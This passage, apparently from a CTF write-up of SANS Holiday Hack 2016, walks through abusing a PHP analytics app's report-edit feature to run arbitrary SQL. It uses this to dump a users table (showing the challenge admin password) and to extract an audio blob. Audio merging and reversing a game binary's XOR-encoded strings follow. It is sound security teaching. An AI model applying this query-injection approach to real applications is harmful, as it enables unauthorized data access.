class=\"s2\">\"`</span><span class=\"nv\">$name</span><span class=\"s2\">`='\"</span> <span class=\"o\">.</span> <span class=\"nx\">mysqli_real_escape_string</span><span class=\"p\">(</span><span class=\"nv\">$db</span><span class=\"p\">,</span> <span class=\"nv\">$_GET</span><span class=\"p\">[</span><span class=\"nv\">$name</span><span class=\"p\">])</span> <span class=\"o\">.</span> <span class=\"s2\">\"'\"</span><span class=\"p\">;</span>\n      <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n\n    <span class=\"nv\">$query</span> <span class=\"o\">=</span> <span class=\"s2\">\"UPDATE `reports` \"</span> <span class=\"o\">.</span>\n      <span class=\"s2\">\"SET \"</span> <span class=\"o\">.</span> <span class=\"nb\">join</span><span class=\"p\">(</span><span class=\"nv\">$set</span><span class=\"p\">,</span> <span class=\"s1\">', '</span><span class=\"p\">)</span> <span class=\"o\">.</span> <span class=\"s1\">' '</span> <span class=\"o\">.</span>\n      <span class=\"s2\">\"WHERE `id`='\"</span> <span class=\"o\">.</span> <span class=\"nx\">mysqli_real_escape_string</span><span class=\"p\">(</span><span class=\"nv\">$db</span><span class=\"p\">,</span> <span class=\"nv\">$_REQUEST</span><span class=\"p\">[</span><span class=\"s1\">'id'</span><span class=\"p\">])</span> <span class=\"o\">.</span> <span class=\"s2\">\"'\"</span><span class=\"p\">;</span>\n    <span class=\"k\">print</span> <span class=\"nb\">htmlentities</span><span class=\"p\">(</span><span class=\"nv\">$query</span><span class=\"p\">);</span>\n\n    <span class=\"nv\">$result</span> <span class=\"o\">=</span> <span class=\"nx\">mysqli_query</span><span class=\"p\">(</span><span class=\"nv\">$db</span><span class=\"p\">,</span> <span class=\"nv\">$query</span><span class=\"p\">);</span>\n    <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nv\">$result</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nx\">reply</span><span class=\"p\">(</span><span class=\"mi\">500</span><span class=\"p\">,</span> <span class=\"s2\">\"SQL error: \"</span> <span class=\"o\">.</span> <span class=\"nx\">mysqli_error</span><span class=\"p\">(</span><span class=\"nv\">$db</span><span class=\"p\">));</span>\n      <span class=\"k\">die</span><span class=\"p\">();</span>\n    <span class=\"p\">}</span>\n\n    <span class=\"k\">print</span> <span class=\"s2\">\"Update complete!\"</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n<span class=\"cp\">?&gt;</span></code></pre> \n</figure> \n<p>After giving a valid report ID (which we can generate by querying and saving the report), the script takes <em>any</em> fields after the <code class=\"highlighter-rouge\">id</code> and updates the corresponding table in the database. The key feature here is the following.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-php\" data-lang=\"php\"><span class=\"cp\">&lt;?php</span>\n<span class=\"nv\">$query</span> <span class=\"o\">=</span> <span class=\"s2\">\"UPDATE `reports` \"</span> <span class=\"o\">.</span>\n    <span class=\"s2\">\"SET \"</span> <span class=\"o\">.</span> <span class=\"nb\">join</span><span class=\"p\">(</span><span class=\"nv\">$set</span><span class=\"p\">,</span> <span class=\"s1\">', '</span><span class=\"p\">)</span> <span class=\"o\">.</span> <span class=\"s1\">' '</span> <span class=\"o\">.</span>\n    <span class=\"s2\">\"WHERE `id`='\"</span> <span class=\"o\">.</span> <span class=\"nx\">mysqli_real_escape_string</span><span class=\"p\">(</span><span class=\"nv\">$db</span><span class=\"p\">,</span> <span class=\"nv\">$_REQUEST</span><span class=\"p\">[</span><span class=\"s1\">'id'</span><span class=\"p\">])</span> <span class=\"o\">.</span> <span class=\"s2\">\"'\"</span><span class=\"p\">;</span>\n<span class=\"k\">print</span> <span class=\"nb\">htmlentities</span><span class=\"p\">(</span><span class=\"nv\">$query</span><span class=\"p\">);</span>\n\n<span class=\"nv\">$result</span> <span class=\"o\">=</span> <span class=\"nx\">mysqli_query</span><span class=\"p\">(</span><span class=\"nv\">$db</span><span class=\"p\">,</span> <span class=\"nv\">$query</span><span class=\"p\">);</span>\n<span class=\"cp\">?&gt;</span></code></pre> \n</figure> \n<p>This allows us to provide any valid entry to update. We need to know what all the fields are in the <code class=\"highlighter-rouge\">reports</code> table. Luckily, we have the SQL schema in the repository as well.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-sql\" data-lang=\"sql\"><span class=\"k\">CREATE</span> <span class=\"k\">TABLE</span> <span class=\"nv\">`reports`</span> <span class=\"p\">(</span>\n  <span class=\"nv\">`id`</span> <span class=\"n\">varchar</span><span class=\"p\">(</span><span class=\"mi\">36</span><span class=\"p\">)</span> <span class=\"k\">NOT</span> <span class=\"k\">NULL</span><span class=\"p\">,</span>\n  <span class=\"nv\">`name`</span> <span class=\"n\">varchar</span><span class=\"p\">(</span><span class=\"mi\">64</span><span class=\"p\">)</span> <span class=\"k\">NOT</span> <span class=\"k\">NULL</span><span class=\"p\">,</span>\n  <span class=\"nv\">`description`</span> <span class=\"n\">text</span><span class=\"p\">,</span>\n  <span class=\"nv\">`query`</span> <span class=\"n\">text</span> <span class=\"k\">NOT</span> <span class=\"k\">NULL</span><span class=\"p\">,</span>\n  <span class=\"k\">PRIMARY</span> <span class=\"k\">KEY</span> <span class=\"p\">(</span><span class=\"nv\">`id`</span><span class=\"p\">)</span>\n<span class=\"p\">)</span> </code></pre> \n</figure> \n<p>Ah, there is a <code class=\"highlighter-rouge\">query</code> field along with the <code class=\"highlighter-rouge\">name</code> and <code class=\"highlighter-rouge\">description</code> fields we already knew about. Looking further in the source, we see that this <code class=\"highlighter-rouge\">query</code> field is executed whenever we view a previous report via <code class=\"highlighter-rouge\">view.php</code>.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-php\" data-lang=\"php\"><span class=\"cp\">&lt;?php</span>\n\n  <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nb\">isset</span><span class=\"p\">(</span><span class=\"nv\">$_GET</span><span class=\"p\">[</span><span class=\"s1\">'id'</span><span class=\"p\">]))</span> <span class=\"p\">{</span>\n    <span class=\"nv\">$result</span> <span class=\"o\">=</span> <span class=\"nx\">mysqli_query</span><span class=\"p\">(</span><span class=\"nv\">$db</span><span class=\"p\">,</span> <span class=\"s2\">\"SELECT * FROM `reports` WHERE `id`='\"</span> <span class=\"o\">.</span> <span class=\"nx\">mysqli_real_escape_string</span><span class=\"p\">(</span><span class=\"nv\">$db</span><span class=\"p\">,</span> <span class=\"nv\">$_GET</span><span class=\"p\">[</span><span class=\"s1\">'id'</span><span class=\"p\">])</span> <span class=\"o\">.</span> <span class=\"s2\">\"' LIMIT 0, 1\"</span><span class=\"p\">);</span>\n    <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nv\">$result</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nx\">reply</span><span class=\"p\">(</span><span class=\"mi\">500</span><span class=\"p\">,</span> <span class=\"s2\">\"MySQL Error: \"</span> <span class=\"o\">.</span> <span class=\"nx\">mysqli_error</span><span class=\"p\">(</span><span class=\"nv\">$db</span><span class=\"p\">));</span>\n      <span class=\"k\">die</span><span class=\"p\">();</span>\n    <span class=\"p\">}</span>\n\n    <span class=\"nv\">$row</span> <span class=\"o\">=</span> <span class=\"nx\">mysqli_fetch_assoc</span><span class=\"p\">(</span><span class=\"nv\">$result</span><span class=\"p\">);</span>\n    <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nv\">$row</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nx\">reply</span><span class=\"p\">(</span><span class=\"mi\">404</span><span class=\"p\">,</span> <span class=\"s2\">\"Report not found!\"</span><span class=\"p\">);</span>\n      <span class=\"k\">die</span><span class=\"p\">();</span>\n    <span class=\"p\">}</span>\n<span class=\"cp\">?&gt;</span>\n\n<span class=\"cp\">&lt;?php</span>\n    <span class=\"nx\">format_sql</span><span class=\"p\">(</span><span class=\"nx\">query</span><span class=\"p\">(</span><span class=\"nv\">$db</span><span class=\"p\">,</span> <span class=\"nv\">$row</span><span class=\"p\">[</span><span class=\"s1\">'query'</span><span class=\"p\">]));</span>\n    <span class=\"p\">}</span>\n<span class=\"cp\">?&gt;</span></code></pre> \n</figure> \n<p>With all of this information, we think we now have the steps to execute arbitrary SQL queries:</p> \n<ul> \n <li>Create a query report and save the ID</li> \n <li>Log in as <code class=\"highlighter-rouge\">administrator</code> and <code class=\"highlighter-rouge\">edit</code> the report’s query field</li> \n <li>View the report and see if our custom query is executed</li> \n</ul> \n<p>Our report currently has ID <code class=\"highlighter-rouge\">80677516-9fc8-451b-8da3-e8148691db75</code>. Because we are curious for what the <code class=\"highlighter-rouge\">administrator</code> password actually is, let’s test with the query <code class=\"highlighter-rouge\">SELECT * from users</code>.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/analytics5.gif\" alt=\"analytics5.gif\" /></p> \n<p>Bazinga! We can now execute arbitrary SQL commands. We also know the <code class=\"highlighter-rouge\">administrator</code> password is <code class=\"highlighter-rouge\">KeepWatchingTheSkies</code>.</p> \n<p>We only need to find the audio file now. Let’s look for a relevant SQL table that should contain the mp3.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-sql\" data-lang=\"sql\"><span class=\"k\">CREATE</span> <span class=\"k\">TABLE</span> <span class=\"nv\">`audio`</span> <span class=\"p\">(</span>\n  <span class=\"nv\">`id`</span> <span class=\"n\">varchar</span><span class=\"p\">(</span><span class=\"mi\">36</span><span class=\"p\">)</span> <span class=\"k\">NOT</span> <span class=\"k\">NULL</span><span class=\"p\">,</span>\n  <span class=\"nv\">`username`</span> <span class=\"n\">varchar</span><span class=\"p\">(</span><span class=\"mi\">32</span><span class=\"p\">)</span> <span class=\"k\">NOT</span> <span class=\"k\">NULL</span><span class=\"p\">,</span>\n  <span class=\"nv\">`filename`</span> <span class=\"n\">varchar</span><span class=\"p\">(</span><span class=\"mi\">32</span><span class=\"p\">)</span> <span class=\"k\">NOT</span> <span class=\"k\">NULL</span><span class=\"p\">,</span>\n  <span class=\"nv\">`mp3`</span> <span class=\"n\">MEDIUMBLOB</span> <span class=\"k\">NOT</span> <span class=\"k\">NULL</span><span class=\"p\">,</span>\n  <span class=\"k\">PRIMARY</span> <span class=\"k\">KEY</span> <span class=\"p\">(</span><span class=\"nv\">`id`</span><span class=\"p\">)</span>\n<span class=\"p\">)</span> </code></pre> \n</figure> \n<p>Alrighty, simple. The query <code class=\"highlighter-rouge\">SELECT * from audio</code> should return the relevant filename and ID.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/analytics-audio.png\" alt=\"analytics-audio.png\" /></p> \n<p>Looking at the relevant <code class=\"highlighter-rouge\">getaudio.php</code> should allow us to download with the newly found ID to retrieve our final audio file.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-php\" data-lang=\"php\"><span class=\"cp\">&lt;?php</span>\n  <span class=\"nv\">$username</span> <span class=\"o\">=</span> <span class=\"nx\">get_username</span><span class=\"p\">();</span>\n\n  <span class=\"c1\">// EXPERIMENTAL! Only allow guest to download.\n</span>  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$username</span> <span class=\"o\">===</span> <span class=\"s1\">'guest'</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"o\">...</span>\n  <span class=\"p\">}</span>\n<span class=\"cp\">?&gt;</span></code></pre> \n</figure> \n<p>Hmm.. we can only download files if we are guest. One idea could be to <code class=\"highlighter-rouge\">UPDATE</code> the <code class=\"highlighter-rouge\">audio</code> table such that the <code class=\"highlighter-rouge\">discombobulatedaudio7.mp3</code> has a username of <code class=\"highlighter-rouge\">guest</code>. Sadly, we can’t execute that command, so we need to find something a bit more tricky.</p> \n<p>We can’t show the raw bytes of the mp3 file? Could we do something like base64 encode the mp3 file so that we can retrieve it from the webpage? Let’s try to execute a query like <code class=\"highlighter-rouge\">SELECT TO_BASE64(mp3) from audio where filename like '%7%'</code></p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/analytics6.gif\" alt=\"analytics6.gif\" /></p> \n<p>And there it is! All that is left now to do is extract the base64 blob and decode it. With that, we have all 7 audio files! Now to figure out who is behind kidnapping Santa!</p> \n<h3 id=\"8-what-are-the-names-of-the-audio-files-you-discovered-from-each-system-above\">8) What are the names of the audio files you discovered from each system above?</h3> \n<p>Just to make sure we have all the files, here are all of the audio files found:</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>APK Asset - discombobulatedaudio1.mp3\nAnalytics Guest - discombobulatedaudio2.mp3\nDungeon Game - discombobulatedaudio3.mp3\nDev - debug-20161224235959-0.mp3\nAds - discombobulatedaudio5.mp3\nException Server - discombobulated-audio-6-XyzE3N9YqKNH.mp3\nAnalytics Administrator - discombobulatedaudio7.mp3\n</code></pre> \n </div> \n</div> \n<h1 id=\"part-5-discombobulated-audio\">Part 5: Discombobulated Audio</h1> \n<p>(Huge thanks for those who have read this far.)</p> \n<p>Our final challenge is to piece together the audio file and figure out what all of the pieces combined say.</p> \n<p>One easy way we can combine all of the audio files is with <a href=\"http://sox.sourceforge.net/\">sox</a>. Sox gives us the ability to combine files, but they need to be WAV files first. To convert all of our MP3 files to WAV, we can use <a href=\"http://mpg321.sourceforge.net/\">mpg321</a>. This process is quite simple.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">audiofiles/mp3s</span> on <span class=\"kc\">master</span>*\n$ ls\ndiscombobulatedaudio1-apk.mp3        discombobulatedaudio3-dungeon.mp3  discombobulatedaudio5.mp3  discombobulatedaudio7.mp3\ndiscombobulatedaudio2-analytics.mp3  discombobulatedaudio4-dev.mp3      discombobulatedaudio6.mp3\n\n<span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">audiofiles/mp3s</span> on <span class=\"kc\">master</span>*\n$ mkdir wavs\n\n<span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">audiofiles/mp3s</span> on <span class=\"kc\">master</span>*\n$ for f in $(ls); do mpg321 -w wavs/$f.wav $f; done\n</code></pre> \n</figure> \n<p>Now we have all of our WAV files in <code class=\"highlighter-rouge\">./wavs</code>, let’s use <code class=\"highlighter-rouge\">sox</code> to combine all of the files into one large file.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">$ sox discombobulatedaudio*wav full.wav\n</code></pre> \n</figure> \n<p>This <code class=\"highlighter-rouge\">full.wav</code> sounds a bit slowed down. For this, we can employ <a href=\"http://www.audacityteam.org/\">Audacity</a></p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/audacity.gif\" alt=\"audacity.gif\" /></p> \n<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/299832440%3Fsecret_token%3Ds-bhjZB&amp;color=ff5500&amp;auto_play=false&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false\"></iframe> \n<p>The phrase spoken in the audio is the last remaining passphrase for the final door.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">Father Christmas, Santa Claus. Or, as I've always known him, Jeff!\n</code></pre> \n</figure> \n<p>For the answers to questions 9 and 10, what better explaination than from the villan himself.</p> \n<h3 id=\"9-who-is-the-villain-behind-the-nefarious-plot\">9) Who is the villain behind the nefarious plot.</h3> \n<h3 id=\"10-why-had-the-villain-abducted-santa\">10) Why had the villain abducted Santa?</h3> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/final.gif\" alt=\"final.gif\" /></p> \n<p>Well there you have it. Another great year of holidayHack. We really like binary knowledge here on ctfhacker.com, so why not dig a little deeper into the dungeon binary to see what else we can find. Shall we?</p> \n<h1 id=\"bonus-features---dungeon-game-20\">BONUS FEATURES - Dungeon Game 2.0</h1> \n<h3 id=\"bonus-1---reversing-the-encryption-of-the-dungeon-game\">BONUS 1 - Reversing the encryption of The Dungeon Game</h3> \n<p>Because we enjoy binaries and reversing, let’s dig into what it would take to statically reverse the configuration file read by the dungeon binary. Let’s look at the final text after we finished the game earlier.</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>The elf says - you have conquered this challenge - the game will now end.\nYour score is 10 [total of 585 points], in 3 moves.\nThis gives you the rank of Beginner.\n</code></pre> \n </div> \n</div> \n<p>Let’s look for each of these strings in the binary.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/bonus1.gif\" alt=\"bonus1.gif\" /></p> \n<p>Recap of the strings and if they are found in the binary:</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>the elf says - no\nyour score - yes\ngives you the rank - no\n</code></pre> \n </div> \n</div> \n<p>Interesting, the “gives you a rank” string is printed immediately after the “Your score” string, but isn’t found in the binary. There must be something else near that prints it.</p> \n<p>In the same function that prints the “Your score” string, there is a call to <code class=\"highlighter-rouge\">rspeak_</code>. This function in turns calls <code class=\"highlighter-rouge\">rspsb2nl_</code>. This is the leg work function. After reversing this function, we know a bit more about what is going on.</p> \n<ul> \n <li>A given number is given to the function</li> \n <li>This number is used to reference for another number in memory (num2)</li> \n <li>Num2 is converted to an index in the configuration file</li> \n <li>Bytes are read from this index and xored with the key of <code class=\"highlighter-rouge\">IanLanceTaylorJr</code></li> \n <li>This calculated byte is passed to <code class=\"highlighter-rouge\">putchar</code> for printing</li> \n <li>Once a null byte is calculated, the function returns</li> \n</ul> \n<p>We want to dump all possible strings in the configuration, which means we need to automate this process. The most difficult part the steps is retrieving <code class=\"highlighter-rouge\">num2</code> from memory. We can ease this problem by dumping all of the reference numbers from memory using <code class=\"highlighter-rouge\">gdb</code>.</p> \n<p>After reversing, we know that the reference numbers are stored at <code class=\"highlighter-rouge\">0x625c08</code>. A quick gdb command can save the bytes at this address to a file.</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>dump dbmemory.dat 0x625c08 0x625c08+0x1000\n</code></pre> \n </div> \n</div> \n<p>Now that we have the reference numbers, a quick Python function can be used to extract the given reference number for our wanted string.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"k\">def</span> <span class=\"nf\">get_offset</span><span class=\"p\">(</span><span class=\"n\">index</span><span class=\"p\">):</span>\n    <span class=\"k\">return</span> <span class=\"n\">struct</span><span class=\"o\">.</span><span class=\"n\">unpack</span><span class=\"p\">(</span><span class=\"s\">'&lt;I'</span><span class=\"p\">,</span> <span class=\"n\">memory</span><span class=\"p\">[</span><span class=\"n\">index</span><span class=\"o\">*</span><span class=\"mi\">4</span><span class=\"p\">:</span><span class=\"n\">index</span><span class=\"o\">*</span><span class=\"mi\">4</span><span class=\"o\">+</span><span class=\"mi\">4</span><span class=\"p\">])[</span><span class=\"mi\">0</span><span class=\"p\">]</span></code></pre> \n</figure> \n<p>We now have all the pieces to dump all the strings in the configuration. The script below will dump all possible strings from the configuration.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"kn\">import</span> <span class=\"nn\">struct</span>\n\n<span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"s\">'dtextc.dat'</span><span class=\"p\">,</span> <span class=\"s\">'rb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">f</span><span class=\"p\">:</span>\n    <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"n\">f</span><span class=\"o\">.</span><span class=\"n\">read</span><span class=\"p\">()</span>\n\n<span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"s\">'dbmemory.dat'</span><span class=\"p\">,</span> <span class=\"s\">'rb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">f</span><span class=\"p\">:</span>\n    <span class=\"n\">memory</span> <span class=\"o\">=</span> <span class=\"n\">f</span><span class=\"o\">.</span><span class=\"n\">read</span><span class=\"p\">()</span>\n\n<span class=\"n\">string_addr</span> <span class=\"o\">=</span> <span class=\"mh\">0x2367</span>\n<span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"s\">'IanLanceTaylorJr'</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">get_offset</span><span class=\"p\">(</span><span class=\"n\">index</span><span class=\"p\">):</span>\n    <span class=\"k\">return</span> <span class=\"n\">struct</span><span class=\"o\">.</span><span class=\"n\">unpack</span><span class=\"p\">(</span><span class=\"s\">'&lt;I'</span><span class=\"p\">,</span> <span class=\"n\">memory</span><span class=\"p\">[</span><span class=\"n\">index</span><span class=\"o\">*</span><span class=\"mi\">4</span><span class=\"p\">:</span><span class=\"n\">index</span><span class=\"o\">*</span><span class=\"mi\">4</span><span class=\"o\">+</span><span class=\"mi\">4</span><span class=\"p\">])[</span><span class=\"mi\">0</span><span class=\"p\">]</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">rspeak</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">):</span>\n    <span class=\"n\">offset</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"o\">~</span><span class=\"n\">get_offset</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">)</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xffffffff</span><span class=\"p\">)</span> <span class=\"o\">*</span> <span class=\"mi\">8</span>\n    <span class=\"n\">orig_offset</span> <span class=\"o\">=</span> <span class=\"n\">curr_offset</span> <span class=\"o\">=</span> <span class=\"n\">offset</span>\n    <span class=\"n\">curr_data</span> <span class=\"o\">=</span> <span class=\"n\">data</span><span class=\"p\">[</span><span class=\"n\">string_addr</span><span class=\"o\">+</span><span class=\"n\">orig_offset</span><span class=\"p\">:]</span>\n    <span class=\"n\">res</span> <span class=\"o\">=</span> <span class=\"s\">''</span>\n    <span class=\"k\">for</span> <span class=\"n\">offset</span><span class=\"p\">,</span> <span class=\"n\">c</span> <span class=\"ow\">in</span> <span class=\"nb\">enumerate</span><span class=\"p\">(</span><span class=\"n\">curr_data</span><span class=\"p\">):</span>\n        <span class=\"n\">offset</span> <span class=\"o\">=</span> <span class=\"n\">offset</span><span class=\"o\">+</span><span class=\"n\">orig_offset</span>\n        <span class=\"n\">curr_key</span> <span class=\"o\">=</span> <span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">[</span><span class=\"n\">offset</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xf</span><span class=\"p\">])</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">offset</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xff</span><span class=\"p\">)</span>\n        <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"n\">curr_key</span> <span class=\"o\">^</span> <span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"n\">c</span><span class=\"p\">))</span>\n        <span class=\"k\">if</span> <span class=\"n\">r</span> <span class=\"o\">==</span> <span class=\"s\">'</span><span class=\"se\">\\0</span><span class=\"s\">'</span><span class=\"p\">:</span>\n            <span class=\"n\">curr_offset</span> <span class=\"o\">=</span> <span class=\"n\">offset</span>\n            <span class=\"k\">return</span> <span class=\"n\">res</span>\n        <span class=\"n\">res</span> <span class=\"o\">+=</span> <span class=\"n\">r</span>\n\n<span class=\"k\">for</span> <span class=\"n\">x</span> <span class=\"ow\">in</span> <span class=\"nb\">xrange</span><span class=\"p\">(</span><span class=\"mh\">0x1000</span><span class=\"p\">):</span>\n    <span class=\"n\">res</span> <span class=\"o\">=</span> <span class=\"n\">rspeak</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">)</span>\n    <span class=\"k\">if</span> <span class=\"n\">res</span><span class=\"p\">:</span>\n        <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"nb\">hex</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">),</span> <span class=\"n\">res</span><span class=\"p\">)</span></code></pre> \n</figure> \n<p>Let’s see the results for the first 25 strings.</p> \n<script type=\"text/javascript\" src=\"https://asciinema.org/a/3np3ohbqp0rv56hxmkeql3tqx.js\" id=\"asciicast-3np3ohbqp0rv56hxmkeql3tqx\" async=\"\"></script> \n<p>Hm.. now that we have the strings.. wouldn’t it be nice to be able to see these strings in our disassembler? Incoming BONUS 2!</p> \n<h3 id=\"bonus-2---adding-the-decrypted-strings-to-binary-ninja\">BONUS 2 - Adding the decrypted strings to Binary Ninja</h3> \n<p>Looking through the various calls to <code class=\"highlighter-rouge\">rspeak_</code>, there are two possible situations:</p> \n<p>A number is passed to <code class=\"highlighter-rouge\">rspeak_</code>:</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/binja2.png\" alt=\"binja2.png\" /></p> \n<p>A number calculated elsewhere is passed to <code class=\"highlighter-rouge\">rspeak_</code>:</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/binja1.png\" alt=\"binja1.png\" /></p> \n<p>For simplicity’s sake, we will only handle the top case for this example.</p> \n<p>Our task will involve the below steps:</p> \n<ul> \n <li>Find all occurances to <code class=\"highlighter-rouge\">rspeak_</code></li> \n <li>Look at the previous instruction</li> \n <li>If that instruction is similar to <code class=\"highlighter-rouge\">mov edi, NUMBER</code>, extract the number</li> \n <li>Call our <code class=\"highlighter-rouge\">rspeak()</code> function we created above</li> \n <li>Write the resulting string as a comment next to the function call</li> \n</ul> \n<p>Binary Ninja’s Python API makes this process quite simple. Let’s look at each of the API calls to achieve each step. The <code class=\"highlighter-rouge\">bv</code> object is the current BinaryView object given to us from Binary Ninja that gives us access to the API from our current analysis.</p> \n<p><em>Find all occurances to <code class=\"highlighter-rouge\">rspeak_</code></em></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"n\">rspeak_addr</span> <span class=\"o\">=</span> <span class=\"n\">bv</span><span class=\"o\">.</span><span class=\"n\">symbols</span><span class=\"p\">[</span><span class=\"s\">'rspeak_'</span><span class=\"p\">]</span><span class=\"o\">.</span><span class=\"n\">address</span>\n<span class=\"n\">rspeaks</span> <span class=\"o\">=</span> <span class=\"n\">bv</span><span class=\"o\">.</span><span class=\"n\">get_code_refs</span><span class=\"p\">(</span><span class=\"n\">rspeak_addr</span><span class=\"p\">)</span></code></pre> \n</figure> \n<p><em>Look at the previous instruction</em></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"k\">for</span> <span class=\"n\">rspeak</span> <span class=\"ow\">in</span> <span class=\"n\">rspeaks</span><span class=\"p\">:</span>\n    <span class=\"n\">curr_func</span> <span class=\"o\">=</span> <span class=\"n\">rspeak</span><span class=\"o\">.</span><span class=\"n\">function</span>\n    <span class=\"k\">for</span> <span class=\"n\">block</span> <span class=\"ow\">in</span> <span class=\"n\">curr_func</span><span class=\"o\">.</span><span class=\"n\">low_level_il</span><span class=\"p\">:</span>\n        <span class=\"k\">for</span> <span class=\"n\">index</span><span class=\"p\">,</span> <span class=\"n\">instr</span> <span class=\"ow\">in</span> <span class=\"nb\">enumerate</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">):</span>\n            <span class=\"k\">if</span> <span class=\"n\">instr</span><span class=\"o\">.</span><span class=\"n\">address</span> <span class=\"o\">!=</span> <span class=\"n\">rspeak</span><span class=\"o\">.</span><span class=\"n\">address</span><span class=\"p\">:</span>\n                <span class=\"k\">continue</span>\n\n            <span class=\"n\">prev_instr</span> <span class=\"o\">=</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">)[</span><span class=\"n\">index</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span></code></pre> \n</figure> \n<p><em>If that instruction is similar to <code class=\"highlighter-rouge\">mov edi, NUMBER</code>, extract the number</em></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"n\">tokens</span> <span class=\"o\">=</span> <span class=\"nb\">list</span><span class=\"p\">(</span><span class=\"n\">prev_instr</span><span class=\"o\">.</span><span class=\"n\">tokens</span><span class=\"p\">)</span>\n<span class=\"k\">if</span> <span class=\"s\">'di'</span> <span class=\"ow\">not</span> <span class=\"ow\">in</span> <span class=\"n\">tokens</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">.</span><span class=\"n\">text</span> <span class=\"ow\">or</span> <span class=\"s\">'0x'</span> <span class=\"ow\">not</span> <span class=\"ow\">in</span> <span class=\"n\">tokens</span><span class=\"p\">[</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">.</span><span class=\"n\">text</span><span class=\"p\">:</span>\n    <span class=\"k\">continue</span></code></pre> \n</figure> \n<p><em>Call our <code class=\"highlighter-rouge\">rspeak()</code> function we created above</em></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"n\">offset</span> <span class=\"o\">=</span> <span class=\"nb\">int</span><span class=\"p\">(</span><span class=\"n\">tokens</span><span class=\"p\">[</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">.</span><span class=\"n\">text</span><span class=\"p\">,</span> <span class=\"mi\">16</span><span class=\"p\">)</span>\n<span class=\"n\">res</span> <span class=\"o\">=</span> <span class=\"n\">deobf_rspeak</span><span class=\"p\">(</span><span class=\"n\">offset</span><span 